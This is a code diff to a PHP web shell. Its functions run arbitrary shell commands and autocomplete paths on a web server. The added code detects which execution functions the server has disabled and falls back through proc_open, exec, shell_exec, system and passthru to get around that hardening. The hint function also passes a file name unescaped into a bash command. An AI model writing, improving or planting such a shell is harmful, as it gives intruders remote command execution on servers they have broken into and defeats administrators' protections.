@@ -1,6 +1,10 @@
 <?php
 
 function featureShell($cmd, $cwd) {
+    static $disable_functions;
+    if (!isset($disable_functions)) {
+        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
+    }
     $stdout = array();
 
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
@@ -15,7 +19,33 @@ function featureShell($cmd, $cwd) {
         return featureDownload($match[1]);
     } else {
         chdir($cwd);
-        exec($cmd, $stdout);
+        if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
+            $descriptorspec = [
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $pipes = [];
+            $proc = proc_open($cmd, $descriptorspec, $pipes);
+            $stdout = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            $errorlevel = proc_close($proc);
+            if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
+                $stdout = '';
+            }
+        } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
+            exec($cmd, $stdout);
+        } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
+            $stdout = shell_exec($cmd);
+        } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
+            $stdout = system($cmd);
+        } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
+            $stdout = passthru($cmd);
+        }
+        if (is_string($stdout)) {
+            $stdout = explode(PHP_EOL, $stdout);
+        }
     }
 
     return array(
@@ -29,6 +59,10 @@ function featurePwd() {
 }
 
 function featureHint($fileName, $cwd, $type) {
+    static $disable_functions;
+    if (!isset($disable_functions)) {
+        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
+    }
     chdir($cwd);
     if ($type == 'cmd') {
         $cmd = "compgen -c $fileName";
@@ -36,7 +70,32 @@ function featureHint($fileName, $cwd, $type) {
         $cmd = "compgen -f $fileName";
     }
     $cmd = "/bin/bash -c \"$cmd\"";
-    $files = explode("\n", shell_exec($cmd));
+    $stdout = '';
+    if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
+        $descriptorspec = [
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $pipes = [];
+        $proc = proc_open($cmd, $descriptorspec, $pipes);
+        $stdout = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+        $stderr = stream_get_contents($pipes[2]);
+        fclose($pipes[2]);
+        $errorlevel = proc_close($proc);
+        if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
+            $stdout = '';
+        }
+    } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
+        exec($cmd, $stdout);
+    } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
+        $stdout = shell_exec($cmd);
+    } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
+        $stdout = system($cmd);
+    } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
+        $stdout = passthru($cmd);
+    }
+    $files = explode("\n", $stdout);
     return array(
         'files' => $files,
     );
